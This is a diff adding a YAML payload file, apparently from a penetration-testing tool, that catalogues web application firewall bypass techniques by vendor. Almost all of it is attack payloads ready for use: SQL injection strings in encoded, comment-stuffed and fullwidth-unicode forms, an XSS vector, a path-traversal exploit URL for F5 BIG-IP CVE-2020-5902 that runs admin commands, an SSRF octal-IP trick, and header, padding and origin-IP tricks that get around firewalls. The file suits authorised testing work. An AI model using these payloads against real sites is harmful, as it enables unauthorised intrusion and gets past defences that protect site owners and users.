@@ -1,0 +1,270 @@
+id: waf_bypass
+name: WAF Bypass Techniques
+version: 1.0.0
+category: misconfiguration
+description: |
+  WAF-bypass payload set, grouped by vendor in the subcategory field. Each
+  payload field contains a bypass technique - a request snippet, header set,
+  or payload mutation - that has been observed to evade that vendor's default
+  ruleset. Use sparingly and within ROE.
+mitre:
+  - T1078
+  - T1190
+owasp_top10:
+  - A05:2021
+references:
+  - https://github.com/0xInfection/Awesome-WAF
+  - https://github.com/EnableSecurity/wafw00f
+  - https://book.hacktricks.xyz/pentesting-web/web-attacks/waf-bypass
+related_tools:
+  - wafw00f
+  - byp4xx
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: cf_origin_direct
+    name: Cloudflare - hit origin direct
+    subcategory: cloudflare
+    encoding: raw
+    tech_targets: [cloudflare]
+    severity_when_works: high
+    payload: |
+      Resolve origin IP via Censys cert search / dnsdumpster / historical DNS, then send Host: target.example.net to origin IP.
+    notes: Best Cloudflare bypass
+    source: https://github.com/christophetd/CloudFlair
+  - id: cf_overlong_http
+    name: Cloudflare - mixed-case HTTP method
+    subcategory: cloudflare
+    encoding: raw
+    tech_targets: [cloudflare]
+    severity_when_works: medium
+    payload: "GeT / HTTP/1.1\r\nHost: target.example.net\r\n\r\n"
+    notes: null
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: cf_double_url
+    name: Cloudflare - double URL encode
+    subcategory: cloudflare
+    encoding: url
+    tech_targets: [cloudflare]
+    severity_when_works: medium
+    payload: "%2527%2520OR%25201%253D1--"
+    notes: null
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: cf_unicode
+    name: Cloudflare - fullwidth chars
+    subcategory: cloudflare
+    encoding: unicode
+    tech_targets: [cloudflare]
+    severity_when_works: medium
+    payload: "＜svg/onload=alert(1)＞"
+    notes: NFKC-collapse trick
+    source: common knowledge
+  - id: akamai_pragma
+    name: Akamai - Pragma akamai-x-cache-on
+    subcategory: akamai
+    encoding: raw
+    tech_targets: [akamai]
+    severity_when_works: medium
+    payload: |
+      Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-true-cache-key
+    notes: Debug headers may bypass some rules
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: akamai_method_override
+    name: Akamai - X-HTTP-Method-Override
+    subcategory: akamai
+    encoding: raw
+    tech_targets: [akamai]
+    severity_when_works: medium
+    payload: |
+      GET /admin HTTP/1.1
+      X-HTTP-Method-Override: POST
+    notes: null
+    source: common knowledge
+  - id: aws_waf_chunked
+    name: AWS WAF - chunked TE
+    subcategory: aws_waf
+    encoding: raw
+    tech_targets: [aws_waf]
+    severity_when_works: medium
+    payload: |
+      Transfer-Encoding: chunked
+      <body in 1-byte chunks>
+    notes: AWS WAF historically did not inspect chunked bodies fully
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: aws_waf_8kb_pad
+    name: AWS WAF - pad body >8KB
+    subcategory: aws_waf
+    encoding: raw
+    tech_targets: [aws_waf]
+    severity_when_works: high
+    payload: |
+      Pad request body with 9000 bytes of A before injecting payload; AWS WAF only inspects first 8KB by default.
+    notes: null
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: f5_x_forwarded_for
+    name: F5 ASM - X-Forwarded-For loopback
+    subcategory: f5
+    encoding: raw
+    tech_targets: [f5]
+    severity_when_works: medium
+    payload: |
+      X-Forwarded-For: 127.0.0.1
+    notes: null
+    source: common knowledge
+  - id: f5_dataplaneapi
+    name: F5 BIG-IP TMUI exploit (CVE-2020-5902)
+    subcategory: f5
+    encoding: raw
+    tech_targets: [f5]
+    severity_when_works: critical
+    payload: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
+    notes: Only on unpatched
+    source: https://www.f5.com/services/support/support-articles/K52145254
+  - id: modsec_paranoia
+    name: ModSecurity - paranoia 1 verbose request
+    subcategory: mod_security
+    encoding: raw
+    tech_targets: [mod_security]
+    severity_when_works: medium
+    payload: "/*!50000UnIoN*/ /*!50000sElEcT*/ 1,2,3"
+    notes: MySQL comment-stuffing avoids CRS sigs
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: modsec_param_pollution
+    name: ModSecurity - HPP via duplicate params
+    subcategory: mod_security
+    encoding: raw
+    tech_targets: [mod_security]
+    severity_when_works: medium
+    payload: |
+      ?id=1&id=' OR 1=1--
+    notes: null
+    source: https://owasp.org/www-community/attacks/Web_Parameter_Tampering
+  - id: incapsula_origin_direct
+    name: Imperva Incapsula - origin direct
+    subcategory: incapsula
+    encoding: raw
+    tech_targets: [incapsula]
+    severity_when_works: high
+    payload: |
+      Find origin via DNS history; send Host header to bypass.
+    notes: null
+    source: https://github.com/0xInfection/Awesome-WAF
+  - id: incapsula_visid
+    name: Imperva Incapsula - visid_incap cookie
+    subcategory: incapsula
+    encoding: raw
+    tech_targets: [incapsula]
+    severity_when_works: medium
+    payload: |
+      Cookie: visid_incap_<accountID>=invalid
+    notes: Force passthrough
+    source: common knowledge
+  - id: sucuri_real_ip
+    name: Sucuri - bypass via origin IP
+    subcategory: sucuri
+    encoding: raw
+    tech_targets: [sucuri]
+    severity_when_works: high
+    payload: |
+      Resolve origin IP, connect direct.
+    notes: null
+    source: common knowledge
+  - id: barracuda_pad
+    name: Barracuda - large header padding
+    subcategory: barracuda
+    encoding: raw
+    tech_targets: [barracuda]
+    severity_when_works: medium
+    payload: |
+      X-Padding: AAAAAAAA... (16KB) then payload
+    notes: null
+    source: common knowledge
+  - id: fortinet_method_post
+    name: FortiWeb - method confusion
+    subcategory: fortinet
+    encoding: raw
+    tech_targets: [fortinet]
+    severity_when_works: medium
+    payload: |
+      Try TRACE/TRACK; some rules only apply to GET/POST
+    notes: null
+    source: common knowledge
+  - id: generic_content_type_xml
+    name: Generic - swap to XML body
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: |
+      Content-Type: application/xml
+      <root><param>' OR 1=1--</param></root>
+    notes: When endpoint accepts XML and JSON
+    source: common knowledge
+  - id: generic_method_get_to_post
+    name: Generic - GET to POST
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      Same params in body instead of querystring
+    notes: null
+    source: common knowledge
+  - id: generic_path_param
+    name: Generic - matrix params
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      /admin;param=value
+    notes: null
+    source: common knowledge
+  - id: generic_protocol_downgrade
+    name: Generic - HTTP/0.9
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "GET /admin\r\n\r\n"
+    notes: Some WAFs skip HTTP/0.9
+    source: common knowledge
+  - id: generic_unicode_bypass
+    name: Generic - unicode payload
+    subcategory: generic
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "ｓｅｌｅｃｔ%20＊%20ｆｒｏｍ%20ｕｓｅｒｓ"
+    notes: NFKC collapse to SQL keywords
+    source: common knowledge
+  - id: generic_inline_comment
+    name: Generic - SQL inline comment
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "SEL/**/ECT/**/1,2,3"
+    notes: null
+    source: common knowledge
+  - id: generic_octal_ip
+    name: Generic - octal IP for SSRF
+    subcategory: generic
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "http://0177.0.0.1/"
+    notes: 127.0.0.1 in octal
+    source: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
+  - id: byp4xx_invocation
+    name: byp4xx tool invocation
+    subcategory: tool_invoke
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: |
+      byp4xx https://target.example.net/admin
+    notes: null
+    source: https://github.com/lobuhi/byp4xx
